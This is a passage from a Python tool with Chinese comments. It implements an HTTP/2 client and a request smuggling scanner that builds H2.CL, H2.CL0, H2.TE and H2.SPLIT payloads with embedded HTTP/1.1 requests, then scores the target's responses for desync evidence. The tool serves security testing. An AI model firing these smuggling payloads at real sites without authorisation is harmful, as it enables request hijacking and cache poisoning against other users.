            return self.dyn[d]
        raise ValueError(f'HPACK 索引越界: {idx}')

    def decode(self, data: bytes) -> list:
        out = []
        pos, n = 0, len(data)
        while pos < n:
            b = data[pos]
            if b & 0x80:
                idx, pos = _hpack_int(data, pos, 7)
                out.append(self._lookup(idx))
            elif b & 0xC0 == 0x40:
                name, value, pos = self._literal(data, pos, 6)
                self._insert(name, value)
                out.append((name, value))
            elif b & 0xE0 == 0x20:
                size, pos = _hpack_int(data, pos, 5)
                self._resize(size)
            else:
                name, value, pos = self._literal(data, pos, 4)
                out.append((name, value))
        return out

    def _literal(self, data: bytes, pos: int, prefix_bits: int) -> tuple:
        idx, pos = _hpack_int(data, pos, prefix_bits)
        name = self._lookup(idx)[0] if idx else None
        if name is None:
            name, pos = _hpack_str(data, pos)
        value, pos = _hpack_str(data, pos)
        return name, value, pos


def _hpack_int_encode(val: int, prefix_bits: int, first_byte: int) -> bytes:
    mask = (1 << prefix_bits) - 1
    if val < mask:
        return bytes((first_byte | val,))
    out = bytearray((first_byte | mask,))
    val -= mask
    while val >= 0x80:
        out.append(0x80 | (val & 0x7f))
        val >>= 7
    out.append(val)
    return bytes(out)


def hpack_encode_literal(headers: list) -> bytes:
    out = bytearray()
    for name, value in headers:
        n = name.encode('ascii') if isinstance(name, str) else name
        v = value.encode('ascii') if isinstance(value, str) else value
        out += _hpack_int_encode(0, 4, 0x00)
        out += _hpack_int_encode(len(n), 7, 0x00)
        out += n
        out += _hpack_int_encode(len(v), 7, 0x00)
        out += v
    return bytes(out)


# ═════════════════════════════════════════════════════════════════════════════
# HTTP/2 帧层（RFC 9113）
# ═════════════════════════════════════════════════════════════════════════════
H2_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
FT_DATA, FT_HEADERS, FT_PRIORITY, FT_RST, FT_SETTINGS = 0x0, 0x1, 0x2, 0x3, 0x4
FT_PUSH, FT_PING, FT_GOAWAY, FT_WINDOW_UPDATE, FT_CONT = 0x5, 0x6, 0x7, 0x8, 0x9
FLAG_END_STREAM, FLAG_END_HEADERS, FLAG_ACK = 0x1, 0x4, 0x1
FLAG_PADDED, FLAG_PRIORITY = 0x8, 0x20
SETTINGS_INITIAL_WINDOW_SIZE = 0x4
SETTINGS_MAX_FRAME_SIZE = 0x5
H2_MAX_FRAME = (1 << 24) - 1  # 3 字节长度字段上限 16777215


def h2_frame(ftype: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    # F7：帧长度与 payload 在同一表达式内求值，并断言不超过 3 字节长度上限
    if len(payload) > 0xffffff:
        raise ValueError(f'帧载荷 {len(payload)} 超过 3 字节长度上限')
    return (len(payload).to_bytes(3, 'big') + bytes((ftype, flags)) +
            struct.pack('>I', stream_id & 0x7fffffff) + payload)


def h2_parse_frames(buf: bytes, pos: int = 0):
    n = len(buf)
    while pos + 9 <= n:
        length = int.from_bytes(buf[pos:pos + 3], 'big')
        end = pos + 9 + length
        if end > n:
            return
        ftype, flags = buf[pos + 3], buf[pos + 4]
        sid = struct.unpack('>I', buf[pos + 5:pos + 9])[0] & 0x7fffffff
        yield ftype, flags, sid, buf[pos + 9:end], end
        pos = end


@dataclass
class H2Stream:
    sid: int
    headers: list = field(default_factory=list)
    body: bytearray = field(default_factory=bytearray)
    ended: bool = False
    rst: Optional[int] = None
    hpack_error: Optional[str] = None

    @property
    def status(self) -> Optional[str]:
        for k, v in self.headers:
            if k == b':status':
                return v.decode('ascii', 'replace')
        return None

    def header(self, name: bytes) -> Optional[bytes]:
        for k, v in self.headers:
            if k == name:
                return v
        return None


def decode_stream_body(s: H2Stream) -> bytes:
    """F3：按 content-encoding 解压响应体（gzip/deflate）；解压失败回退原始字节。"""
    body = bytes(s.body)
    ce = (s.header(b'content-encoding') or b'').strip().lower()
    if not ce or ce == b'identity':
        return body
    if b'gzip' in ce:
        try:
            return zlib.decompress(body, 16 + zlib.MAX_WBITS)
        except zlib.error:
            try:  # 容错：部分中间件把 zlib 流错标为 gzip
                return zlib.decompress(body)
            except zlib.error:
                return body
    if b'deflate' in ce:
        for w in (zlib.MAX_WBITS, -zlib.MAX_WBITS):
            try:
                return zlib.decompress(body, w)
            except zlib.error:
                pass
    return body  # br 等无标准库支持的编码：靠请求侧 identity 预防


def _strip_headers_payload(payload: bytes, flags: int) -> bytes:
    # F6：padding / priority 长度校验，非法帧抛 H2Error 而非 IndexError
    pos, pad = 0, 0
    if flags & FLAG_PADDED:
        if not payload:
            raise H2Error('Padded HEADERS 帧载荷为空')
        pad = payload[0]
        pos = 1
    if flags & FLAG_PRIORITY:
        pos += 5
    end = len(payload) - pad
    if pos > end or end > len(payload):
        raise H2Error('HEADERS padding/优先级字段长度非法')
    return payload[pos:end]


def _strip_data_payload(payload: bytes, flags: int) -> bytes:
    if flags & FLAG_PADDED:
        if not payload:
            raise H2Error('Padded DATA 帧载荷为空')
        pad = payload[0]
        if 1 + pad > len(payload):
            raise H2Error('DATA padding 长度非法')
        return payload[1:len(payload) - pad]
    return payload


class H2Error(Exception):
    pass


class H2Conn:
    """最小 HTTP/2 客户端（加固版）：解析对端 SETTINGS、帧校验、size_limit、流计数器。"""

    def __init__(self, target: Target, cfg: ProbeConfig):
        self.sock = None
        self.hpack = HpackDecoder()
        self.streams: dict = {}
        self.goaway: Optional[tuple] = None
        self.conn_error: Optional[str] = None
        self.buf = bytearray()
        self._frag_sid: Optional[int] = None
        self._frag = bytearray()
        self._next_sid = 1                # F10：会话级流计数器
        self._rx = 0                      # F9：接收字节累计
        self.peer_max_frame = 16384       # F7：对端 SETTINGS 覆盖
        self.size_limit = cfg.size_limit
        sock, _, _ = open_connection(target, cfg.insecure, cfg.connect_timeout,
                                     alpn_protos=['h2', 'http/1.1'])
        proto = None
        if hasattr(sock, 'selected_alpn_protocol'):
            proto = sock.selected_alpn_protocol()
        if proto != 'h2':
            sock.close()
            raise H2Error(f'ALPN 未协商 h2 (got {proto!r})')
        self.sock = sock
        settings = struct.pack('>II', SETTINGS_INITIAL_WINDOW_SIZE, 1 << 20)
        self.sock.sendall(H2_PREFACE + h2_frame(FT_SETTINGS, 0, 0, settings))
        self.sock.sendall(h2_frame(FT_WINDOW_UPDATE, 0, 0,
                                   struct.pack('>I', (1 << 24) - 65535)))

    def new_stream(self) -> int:
        sid = self._next_sid
        self._next_sid += 2
        return sid

    def send_request(self, sid: int, headers: list, data: bytes = b'',
                     end_stream: bool = True) -> None:
        hp = hpack_encode_literal(headers)
        if not data:
            flags = FLAG_END_HEADERS | (FLAG_END_STREAM if end_stream else 0)
            self.sock.sendall(h2_frame(FT_HEADERS, flags, sid, hp))
            return
        self.sock.sendall(h2_frame(FT_HEADERS, FLAG_END_HEADERS, sid, hp))
        step = min(self.peer_max_frame, 16384)
        for i in range(0, len(data), step):
            chunk = data[i:i + step]
            last = i + step >= len(data)
            flags = FLAG_END_STREAM if (end_stream and last) else 0
            self.sock.sendall(h2_frame(FT_DATA, flags, sid, chunk))

    def pump(self, want_sids, timeout: float) -> None:
        deadline = time.monotonic() + timeout
        while True:
            if self.conn_error is not None:
                break
            # FIX-4：GOAWAY(NO_ERROR) 是优雅关闭，在途流响应仍可能到达，
            # 继续读取直至超时/EOF；非零错误码表示连接即将强制终止，立即停止
            if self.goaway is not None and self.goaway[1] != H2_ERR_NO_ERROR:
                break
            if all(self.streams.get(s) and self.streams[s].ended
                   for s in want_sids):
                break
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            self.sock.settimeout(remaining)
            try:
                chunk = self.sock.recv(65536)
            except socket.timeout:
                break
            except OSError as e:
                self.conn_error = f'{type(e).__name__}: {e}'
                break
            if not chunk:
                self.conn_error = 'connection-closed'
                break
            self._rx += len(chunk)
            if self._rx > self.size_limit:                 # F9
                self.conn_error = 'size-limit'
                break
            self.buf += chunk
            try:
                self._drain_frames()
            except (H2Error, ValueError, IndexError) as e:  # F6：畸形帧不击穿会话
                self.conn_error = f'malformed-frame: {e}'
                break

    def _drain_frames(self) -> None:
        pos = 0
        for ftype, flags, sid, payload, pos in h2_parse_frames(bytes(self.buf)):
            self._handle(ftype, flags, sid, payload)
        del self.buf[:pos]

    def _finish_headers(self, sid: int, end_stream: bool) -> None:
        st = self.streams.setdefault(sid, H2Stream(sid))
        if not st.headers:  # F8：trailers 不混入响应头
            try:
                st.headers.extend(self.hpack.decode(bytes(self._frag)))
            except ValueError as e:
                st.hpack_error = str(e)
        self._frag_sid, self._frag = None, bytearray()
        if end_stream:
            st.ended = True

    def _handle(self, ftype: int, flags: int, sid: int, payload: bytes) -> None:
        if ftype == FT_HEADERS:
            if self._frag_sid is not None:
                raise H2Error('HEADERS 交错未完成的 header 块')   # F8
            self._frag_sid, self._frag = sid, bytearray(
                _strip_headers_payload(payload, flags))
            if flags & FLAG_END_HEADERS:
                self._finish_headers(sid, bool(flags & FLAG_END_STREAM))
        elif ftype == FT_CONT:
            if self._frag_sid is None or sid != self._frag_sid:  # F8
                raise H2Error('CONTINUATION 与前置 HEADERS 流不一致')
            self._frag += payload
            if flags & FLAG_END_HEADERS:
                self._finish_headers(sid, bool(flags & FLAG_END_STREAM))
        elif ftype == FT_DATA:
            data = _strip_data_payload(payload, flags)
            st = self.streams.setdefault(sid, H2Stream(sid))
            st.body += data
            if flags & FLAG_END_STREAM:
                st.ended = True
            if data:
                self._replenish(sid, len(data))
        elif ftype == FT_RST:
            st = self.streams.setdefault(sid, H2Stream(sid))
            if len(payload) >= 4:
                st.rst = struct.unpack('>I', payload[:4])[0]
        elif ftype == FT_SETTINGS:
            if not flags & FLAG_ACK:
                if len(payload) % 8 == 0:                        # F7
                    for i in range(0, len(payload), 8):
                        k = struct.unpack('>I', payload[i:i + 4])[0]
                        v = struct.unpack('>I', payload[i + 4:i + 8])[0]
                        if k == SETTINGS_MAX_FRAME_SIZE:
                            self.peer_max_frame = max(1, min(v, 0xffffff))
                self._try_send(h2_frame(FT_SETTINGS, FLAG_ACK, 0, b''))
        elif ftype == FT_PING:
            if not flags & FLAG_ACK:
                self._try_send(h2_frame(FT_PING, FLAG_ACK, 0, payload))
        elif ftype == FT_GOAWAY:
            if len(payload) >= 8:
                last, err = struct.unpack('>II', payload[:8])
                self.goaway = (last, err)

    def _replenish(self, sid: int, nbytes: int) -> None:
        inc = struct.pack('>I', nbytes)
        self._try_send(h2_frame(FT_WINDOW_UPDATE, 0, 0, inc))
        self._try_send(h2_frame(FT_WINDOW_UPDATE, 0, sid, inc))

    def _try_send(self, frame: bytes) -> None:
        try:
            self.sock.sendall(frame)
        except OSError:
            pass

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass


# ─── H2 探测载荷构造 ──────────────────────────────────────────────────────────
@dataclass(frozen=True)
class H2Payload:
    headers: list
    data: bytes


@dataclass(frozen=True)
class H2Ctx:
    authority: str
    host_bytes: bytes
    path: str
    marker_path: bytes
    mode: str


def _h2_post_base(ctx: H2Ctx) -> list:
    # F3：identity 编码，避免压缩体致盲 marker 匹配
    return [(':method', 'POST'), (':path', ctx.path), (':scheme', 'https'),
            (':authority', ctx.authority),
            ('content-type', 'application/x-www-form-urlencoded'),
            ('accept-encoding', 'identity')]


def _h2_smuggled(ctx: H2Ctx) -> bytes:
    fn = _smuggled_get_open if ctx.mode == 'hang' else _smuggled_get_closed
    return fn(ctx.host_bytes, ctx.marker_path)


def build_h2_cl(ctx: H2Ctx) -> H2Payload:
    pad = b'q=h2cl'
    return H2Payload(_h2_post_base(ctx) + [('content-length', str(len(pad)))],
                     pad + _h2_smuggled(ctx))


def build_h2_te(ctx: H2Ctx) -> H2Payload:
    pad = b'q=h2te'
    return H2Payload(_h2_post_base(ctx) + [('transfer-encoding', 'chunked')],
                     pad + _h2_smuggled(ctx))


def build_h2_cl_zero(ctx: H2Ctx) -> H2Payload:
    """FIX-6：H2.CL 第二变体 —— content-length: 0 而 DATA 含前缀+走私体。

    前端若信任 CL=0 认为无 body 但仍将 DATA 写往后端连接，整个走私体成为
    leftover。注意：不采用 CL±1 变体（走私体会错位为 'lGET...'/'ET ...'，
    H1 解析必败）；也不采用 oversized（仅令前端等待更多数据，无走私语义）。
    """
    pad = b'q=h2cl0'
    return H2Payload(_h2_post_base(ctx) + [('content-length', '0')],
                     pad + _h2_smuggled(ctx))


def build_h2_split(ctx: H2Ctx) -> H2Payload:
    smuggled = _smuggled_get_closed(ctx.host_bytes, ctx.marker_path)
    return H2Payload(_h2_post_base(ctx) + [('content-length', str(len(smuggled)))],
                     smuggled)


@dataclass(frozen=True)
class H2Technique:
    key: str
    name: str
    description: str
    build: Callable
    modes: tuple = ('hang', 'shift')


H2_TECHNIQUES = [
    H2Technique('h2_cl', 'H2.CL',
                'H2 content-length 与 DATA 长度不一致 → H1 转换层截断走私',
                build_h2_cl),
    H2Technique('h2_cl0', 'H2.CL0',
                'content-length: 0 + DATA 含走私体 → 前端按零长 body 处理时整体 leftover',
                build_h2_cl_zero),
    H2Technique('h2_te', 'H2.TE',
                'H2 请求携带 transfer-encoding（协议禁止）→ 分帧语义分歧',
                build_h2_te),
    H2Technique('h2_split', 'H2.SPLIT',
                'DATA 内嵌完整 H1 请求，探测前端请求拆分漏洞',
                build_h2_split, modes=('shift',)),
]


def select_h2_techniques(spec: str) -> list:
    if not spec or spec == 'all':
        return list(H2_TECHNIQUES)
    by_key = {t.key: t for t in H2_TECHNIQUES}
    picked = []
    for part in spec.split(','):
        part = part.strip()
        if part not in by_key:
            raise SystemExit(f'[!] 未知 H2 技术标识 {part!r}，可选: all, ' +
                             ', '.join(by_key))
        picked.append(by_key[part])
    return picked


def h2_modes_of(cfg: ProbeConfig, tech: H2Technique) -> list:
    if cfg.mode == 'both':
        return list(tech.modes)
    return [m for m in tech.modes if m == cfg.mode]


# ─── marker / victim 命中判定（F4：语境强化）───────────────────────────────────
_ECHO_HINTS = (b'q=h2cl', b'q=h2te', b'q=h2-control', b'content-type',
               b'transfer-encoding', b'x-www-form-urlencoded',
               b':authority', b':path', b'http/1.1', b'http/2')


def _is_echo_page(body: bytes) -> bool:
    low = body.lower()
    return any(h in low for h in _ECHO_HINTS)


def token_hit(s: Optional[H2Stream], token_b: bytes) -> bool:
    """token 命中判定：location 需 2xx/3xx 语境；body 排除错误码与回显页。"""
    if s is None:
        return False
    loc = (s.header(b'location') or b'')
    if token_b in loc:
        st = s.status or ''
        return st[:1] in ('2', '3')
    if s.status in BAD_CODES:
        return False
    body = decode_stream_body(s)
    if token_b not in body:
        return False
    return not _is_echo_page(body)


# ─── 探测记录与轮分析 ─────────────────────────────────────────────────────────
@dataclass
class H2ProbeRecord:
    probe_id: str
    technique: str
    mode: str
    round_no: int
    marker_token: str
    victim_token: str
    host_header: bytes
    s1: Optional[H2Stream]
    s3: Optional[H2Stream]
    goaway: Optional[tuple]
    conn_error: Optional[str]
    phase: str                      # connect / probe（F2）
    elapsed_ms: float
    wait_s: float = 0.0             # FIX-3：本轮实际使用的毒化等待
    analysis: Optional[RoundAnalysis] = None


def analyze_h2_round(rec: H2ProbeRecord, control: Optional[ControlResult],
                     baseline: Optional[BaselineResult]) -> RoundAnalysis:
    ev: list = []
    statuses = [s.status for s in (rec.s1, rec.s3) if s is not None and s.status]
    marker_b = rec.marker_token.encode('ascii')

    # F2：连接建立阶段失败 → INVALID 轮，不产生任何证据
    if rec.phase == 'connect' and rec.conn_error:
        return RoundAnalysis(ev, 0, 'INVALID', statuses, EndReason.ERROR)

    # ① marker：victim 流命中 = definitive；毒包流命中降级（F4）
    if token_hit(rec.s3, marker_b):
        ev.append(Evidence(EV_MARKER, 'marker 出现在 victim 流响应（走私请求被后端执行）'))
    elif token_hit(rec.s1, marker_b):
        ev.append(Evidence(EV_MARKER_S1, 'marker 出现在毒包流响应（可能错位/回显，降权待复现）'))

    # F1+FIX-4：错误码分类 —— 合规拒绝 / 良性 / 疑似 / 未知
    s1_rst = rec.s1.rst if rec.s1 is not None else None
    goaway_err = rec.goaway[1] if rec.goaway is not None else None
    rst_reject = s1_rst is not None and s1_rst in RST_REJECT_CODES
    rst_benign = s1_rst is not None and s1_rst in RST_BENIGN_CODES
    goaway_reject = goaway_err is not None and goaway_err in GOAWAY_REJECT_CODES
    goaway_benign = goaway_err is not None and goaway_err in GOAWAY_BENIGN_CODES
    goaway_suspect = goaway_err is not None and goaway_err in GOAWAY_SUSPECT_CODES
    rejected = rst_reject or goaway_reject
    benign = rst_benign or goaway_benign

    if rejected:
        why = (f'RST_STREAM err={s1_rst}' if rst_reject
               else f'GOAWAY err={goaway_err}')
        ev.append(Evidence(EV_REJECTED_OK, f'前端以合规方式拒绝毒包（{why}），不计走私证据'))
    elif benign:
        why = (f'RST_STREAM err={s1_rst}(REFUSED/CANCEL)' if rst_benign
               else f'GOAWAY err={goaway_err}(优雅关闭/限流/H1要求)')
        ev.append(Evidence(EV_REJECTED_OK, f'连接终止为非走私语义（{why}），不计证据'))
    elif goaway_suspect:
        ev.append(Evidence(EV_GOAWAY_INTERNAL,
                           f'GOAWAY err={H2_ERR_INTERNAL}(INTERNAL_ERROR)：可能是后端处理'
                           f'毒包时异常，也可能与目标业务相关，建议人工复核'))

    control_ok = bool(control and control.ok)
    s1_dead = rec.s1 is None or not rec.s1.headers
    s3_dead = rec.s3 is None or not rec.s3.headers
    s1_answered = rec.s1 is not None and bool(rec.s1.headers)

    # ② 差分挂起：毒包流无响应、对照正常、且非拒绝/良性/连接期失败
    if control_ok and s1_dead and not rejected and not benign:
        ev.append(Evidence(EV_DIFF_HANG, '毒包流无响应而对照正常完成'))

    # ③ victim 被吞：毒包流有响应（不再用状态码猜测）、对照 victim 正常（F4）
    if (control_ok and control.victim_responded and s1_answered
            and s3_dead and not rejected and not benign):
        ev.append(Evidence(EV_VICTIM_MISSING, 'victim 流未收到响应'))

    # ④ 连接被杀（FIX-4）：
    #    - GOAWAY(NO_ERROR) 优雅关闭后连接断开（conn_error=connection-closed）不算被杀
    #    - 拒绝/良性/疑似码已在上方单独分类，此处只处理未知错误码与传输层错误
    graceful_close = (goaway_err == H2_ERR_NO_ERROR
                      and rec.conn_error == 'connection-closed')
    transport_error = (rec.conn_error is not None and not graceful_close)
    unknown_goaway = (goaway_err is not None
                      and goaway_err not in GOAWAY_REJECT_CODES
                      and goaway_err not in GOAWAY_BENIGN_CODES
                      and goaway_err not in GOAWAY_SUSPECT_CODES)
    killed = transport_error or unknown_goaway
    if killed and control_ok and not rejected and not benign:
        why = rec.conn_error or f'GOAWAY err={goaway_err}（未知含义）'
        ev.append(Evidence(EV_CONN_KILLED, f'连接终止（{why}），对照正常'))

    # ⑤⑥ 弱证据：与 基线∪对照 比较
    ref = set(control.statuses) if control_ok else set()
    if baseline is not None and baseline.ok:
        ref |= baseline.statuses
    bad_here = set(statuses) & BAD_CODES
    if bad_here and control_ok and not (set(control.statuses) & BAD_CODES):
        ev.append(Evidence(EV_ERROR_CODE, f'出现 {sorted(bad_here)} 且对照无'))
    if control_ok and statuses and statuses[0] not in ref:
        ev.append(Evidence(EV_STATUS_ANOMALY,
                           f'毒包流 {statuses[0]} 不在基线∪对照分布 {sorted(ref)}'))

    score = sum(EV_WEIGHTS[e.code] for e in ev)
    if any(e.code in EV_DEFINITIVE for e in ev):
        confidence = 'HIGH'
    elif score >= 4:
        confidence = 'MEDIUM'
    else:
        confidence = 'LOW'

    if rec.conn_error is not None:
        end_reason = EndReason.ERROR
    elif s1_dead:
        end_reason = EndReason.FIRST_BYTE_TIMEOUT
    elif s3_dead:
        end_reason = EndReason.BODY_TIMEOUT
    else:
        end_reason = EndReason.EOF
    return RoundAnalysis(ev, score, confidence, statuses, end_reason)


def _h2_victim_headers(authority: str, victim_path: bytes) -> list:
    return [(':method', 'GET'), (':path', victim_path.decode('ascii', 'replace')),
            (':scheme', 'https'), (':authority', authority),
            ('accept-encoding', 'identity')]


def run_h2_control(target: Target, cfg: ProbeConfig,
                   victim_token: str, wait_s: float) -> ControlResult:
    """对照：合法 H2 POST（CL 与 DATA 严格一致）+ victim GET，与毒包序列同构。"""
    conn = None
    t0 = time.monotonic()
    try:
        conn = H2Conn(target, cfg)
        body = b'q=h2-control'
        s1 = conn.new_stream()
        conn.send_request(s1, [
            (':method', 'POST'), (':path', target.path.decode('ascii', 'replace')),
            (':scheme', 'https'),
            (':authority', target.host_header.decode('ascii', 'replace')),
            ('content-type', 'application/x-www-form-urlencoded'),
            ('accept-encoding', 'identity'),
            ('content-length', str(len(body)))], body)
        time.sleep(wait_s)                     # FIX-3：与毒包轮使用同一等待值
        s3 = conn.new_stream()
        conn.send_request(s3, _h2_victim_headers(
            target.host_header.decode('ascii', 'replace'),
            child_path(target.path, victim_token)), b'')
        conn.pump({s1, s3}, cfg.phase_timeout * 2)
    except (OSError, H2Error) as e:
        if conn is not None:
            conn.close()
        return ControlResult(False, None, 0, set(), False, False, None,
                             f'{type(e).__name__}: {e}')
    st1, st3 = conn.streams.get(s1), conn.streams.get(s3)
    statuses = {s.status for s in (st1, st3) if s is not None and s.status}
    victim_responded = st3 is not None and st3.status is not None
    victim_token_seen = token_hit(st3, victim_token.encode('ascii'))
    ok = bool(statuses) and conn.conn_error is None and not (st3 and st3.rst is not None)
    rtt = (time.monotonic() - t0) * 1000.0
    conn.close()
    return ControlResult(ok, EndReason.EOF if ok else None, len(statuses),
                         statuses, victim_responded, victim_token_seen, rtt)


def collect_rtt_baseline(target: Target, cfg: ProbeConfig, n: int = 3) -> BaselineResult:
    """F5+FIX-2：探测前建立 RTT / 状态码 / 大小基线。

    有效性策略：2xx/3xx/4xx 中的确定性响应（含 404/405——它们是快速正常往返，
    排除反而丢样本）计入 RTT；5xx 与 BAD_CODES 属于慢速错误路径，不计入 RTT
    但计入 error_samples 供诊断；网络异常/RST 不计入并最多重试（3×n 次上限）。
    """
    want = max(1, n)
    rtts, statuses, sizes = [], set(), []
    attempts = 0
    max_attempts = want * 3
    errors = 0
    while len(rtts) < want and attempts < max_attempts:
        attempts += 1
        conn = None
        t0 = time.monotonic()
        try:
            conn = H2Conn(target, cfg)
            sid = conn.new_stream()
            conn.send_request(sid, _h2_victim_headers(
                target.host_header.decode('ascii', 'replace'), target.path), b'')
            conn.pump({sid}, cfg.phase_timeout)
            st = conn.streams.get(sid)
            if st is None or not st.status:
                errors += 1          # 无响应 / RST / 连接失败
                continue
            statuses.add(st.status)
            sizes.append(len(st.body))
            if st.status[0] in '234' and st.status not in BAD_CODES:
                rtts.append((time.monotonic() - t0) * 1000.0)
            else:
                errors += 1          # 5xx / 400 / 502 / 503 慢错误路径
        except (OSError, H2Error):
            errors += 1
        finally:
            if conn is not None:
                conn.close()
    ok = bool(statuses)
    size_range = (min(sizes), max(sizes)) if sizes else (0, 0)
    result = BaselineResult(ok, statuses, size_range, rtts, attempts, errors)
    if result.insufficient:
        print(f'[WARN] 基线有效样本仅 {len(rtts)}/{want}（尝试 {attempts} 次，'
              f'异常 {errors} 次），自适应等待/状态分布参考可能不准确，'
              f'建议检查目标是否拒绝基线探测')
    return result


def run_h2_probe(target: Target, cfg: ProbeConfig, probe_id: str, tech: H2Technique,
                 mode: str, round_no: int, marker_token: str,
                 victim_token: str, wait_s: float) -> H2ProbeRecord:
    t0 = time.monotonic()
    conn_error = None
    phase = 'connect'                                  # F2
    conn = None
    try:
        conn = H2Conn(target, cfg)
    except (OSError, H2Error) as e:
        conn_error = f'{type(e).__name__}: {e}'
        return H2ProbeRecord(probe_id, tech.name, mode, round_no, marker_token,
                             victim_token, target.host_header, None, None, None,
                             conn_error, phase, (time.monotonic() - t0) * 1000.0,
                             wait_s)
    phase = 'probe'
    s1 = s3 = None
    goaway = None
    try:
        ctx = H2Ctx(authority=target.host_header.decode('ascii', 'replace'),
                    host_bytes=target.host_header,
                    path=target.path.decode('ascii', 'replace'),
                    marker_path=child_path(target.path, marker_token),
                    mode=mode)
        payload = tech.build(ctx)
        s1 = conn.new_stream()
        conn.send_request(s1, payload.headers, payload.data)
        time.sleep(wait_s)                     # FIX-3：自适应毒化等待
        s3 = conn.new_stream()
        conn.send_request(s3, _h2_victim_headers(
            ctx.authority, child_path(target.path, victim_token)), b'')
        conn.pump({s1, s3}, cfg.phase_timeout * 2)
    except (OSError, H2Error) as e:
        conn_error = f'{type(e).__name__}: {e}'
    finally:
        goaway = conn.goaway
        conn.close()
    if conn_error is None and conn.conn_error:
        conn_error = conn.conn_error
    return H2ProbeRecord(probe_id, tech.name, mode, round_no, marker_token,
                         victim_token, target.host_header,
                         conn.streams.get(s1), conn.streams.get(s3),
                         goaway, conn_error, phase,
                         (time.monotonic() - t0) * 1000.0, wait_s)


def _h2_round_line(rec: H2ProbeRecord) -> str:
    a = rec.analysis
    if a is None:
        return f'[{rec.mode}/r{rec.round_no}] 分析缺失'
    codes = ', '.join(f'{e.code}({EV_WEIGHTS[e.code]})' for e in a.evidences) or '无'
    s1s = rec.s1.status if rec.s1 else '-'
    s3s = rec.s3.status if rec.s3 else '-'
    return (f'[{rec.mode}/r{rec.round_no}] s1={s1s} s3={s3s} '
            f'{a.end_reason.value if a.end_reason else "?"} | '
            f'total={rec.elapsed_ms:.0f}ms | 证据: {codes} → '
            f'score {a.score} → {a.confidence}')


def run_h2_session(target: Target, cfg: ProbeConfig, h2_techs: list,
                   artifacts: Artifacts, baseline: BaselineResult) -> list:
    verdicts = []
    # FIX-3：整个会话使用同一自适应等待（control/毒包同构）
    wait_s = _adaptive_wait(baseline, cfg)
    if cfg.adaptive_delay:
        src = (f'基线 p95={round(baseline.p95_ms)}ms' if not baseline.insufficient
               else '基线不足，回退保守值')
        print(f'\n[i] 自适应毒化等待: {wait_s:.2f}s（{src}；--no-adaptive-delay 可关闭）')
    for tech in h2_techs:
        modes = h2_modes_of(cfg, tech)
        if not modes:
            print(f'\n==> {tech.name}  跳过（--mode {cfg.mode} 不在其支持模式 '
                  f'{list(tech.modes)} 内）')
            continue
        for mode in modes:
            control = run_h2_control(target, cfg, gen_victim_token(), wait_s)
            rtt_txt = f' rtt={control.rtt_ms:.0f}ms' if control.rtt_ms else ''
            print(f'\n==> {tech.name}/{mode}  H2 对照: ok={control.ok} '
                  f'statuses={sorted(control.statuses)}{rtt_txt}'
                  + (f' err={control.error}' if control.error else ''))
            rounds, records, invalid = [], [], 0
            for i in range(cfg.rounds):
                seq = secrets.token_hex(4)
                probe_id = f'{tech.key}-{mode}-r{i + 1}-{seq}'
                rec = run_h2_probe(target, cfg, probe_id, tech, mode, i + 1,
                                   gen_marker_token(), gen_victim_token(), wait_s)
                rec.analysis = analyze_h2_round(rec, control, baseline)
                artifacts.save_probe(rec)
                print(f'  {_h2_round_line(rec)}')
                if rec.analysis.confidence == 'INVALID':
                    invalid += 1
                else:
                    rounds.append(rec.analysis)
                records.append(rec)
            verdict = aggregate_technique(tech.name, mode, rounds,
                                          cfg.repro_threshold, invalid)
            if records:
                valid_recs = [r for r in records if r.analysis.confidence != 'INVALID']
                if valid_recs:
                    verdict.best_record = max(valid_recs,
                                              key=lambda r: r.analysis.score)
            repro_txt = ', '.join(f'{c} {h}/{n}'
                                  for c, (h, n) in verdict.evidence_repro.items()) or '无'
            print(f'>>> {verdict.verdict} | 复现率: {repro_txt}')
            verdicts.append((tech, verdict))
    return verdicts


# ─── H3 可用性提示 ────────────────────────────────────────────────────────────
def probe_h3_hint(target: Target, cfg: ProbeConfig) -> dict:
    out = {'alt_svc': None, 'h3_advertised': False, 'note': ''}
    try:
        conn = H2Conn(target, cfg)
    except (OSError, H2Error) as e:
        out['note'] = f'H2 连接失败: {type(e).__name__}: {e}'
        return out
    try:
        sid = conn.new_stream()
        conn.send_request(sid, _h2_victim_headers(
            target.host_header.decode('ascii', 'replace'), target.path), b'')
        conn.pump({sid}, cfg.phase_timeout)
        st = conn.streams.get(sid)
        alt = st.header(b'alt-svc') if st else None
        if alt:
            out['alt_svc'] = _dec(alt)
            out['h3_advertised'] = b'h3' in alt
    finally:
        conn.close()
    return out


def print_h3_hint(hint: dict) -> None:
    if hint.get('h3_advertised'):
        note = (f"alt-svc: {hint['alt_svc']}\n"
                '前端宣告 H3/QUIC 支持。标准库无 QUIC 栈，本工具不做 H3 语义级走私探测；\n'
                '建议用专用 QUIC 工具验证 H3→H1 转换层的分帧一致性（H3.CL / H3.TE 同型风险）')
    elif hint.get('alt_svc'):
        note = f"alt-svc: {hint['alt_svc']}（未见 h3 宣告）"
    else:
        note = hint.get('note') or '响应未携带 alt-svc（未见 H3 宣告）'
    section('H3 可用性提示 (informational)', note)


# ─── 工件落盘 ─────────────────────────────────────────────────────────────────
class H2Artifacts(Artifacts):
    def save_probe(self, rec: H2ProbeRecord) -> None:
        a = rec.analysis
        self._line({
            'ts': time.time(), 'probe_id': rec.probe_id,
            'technique': rec.technique, 'mode': rec.mode, 'round': rec.round_no,
            'marker': rec.marker_token, 'victim': rec.victim_token,
            'layer': 'h2', 'phase': rec.phase, 'conn_error': rec.conn_error,
            'wait_s': round(rec.wait_s, 3),
            'goaway': list(rec.goaway) if rec.goaway else None,
            's1_status': rec.s1.status if rec.s1 else None,
            's1_rst': rec.s1.rst if rec.s1 else None,
            's3_status': rec.s3.status if rec.s3 else None,
            'evidence': [e.code for e in a.evidences] if a else [],
            'score': a.score if a else 0,
            'confidence': a.confidence if a else 'LOW',
            'elapsed_ms': round(rec.elapsed_ms, 1),
        })
        parts = [
            f'probe_id : {rec.probe_id}',
            f'tech/mode/round : {rec.technique} / {rec.mode} / {rec.round_no}  (HTTP/2)',
            f'marker / victim : {rec.marker_token} / {rec.victim_token}',
            f'phase / conn_error : {rec.phase} / {rec.conn_error}',
            f'goaway : {rec.goaway}',
            f's1_rst : {rec.s1.rst if rec.s1 else None}',
        ]
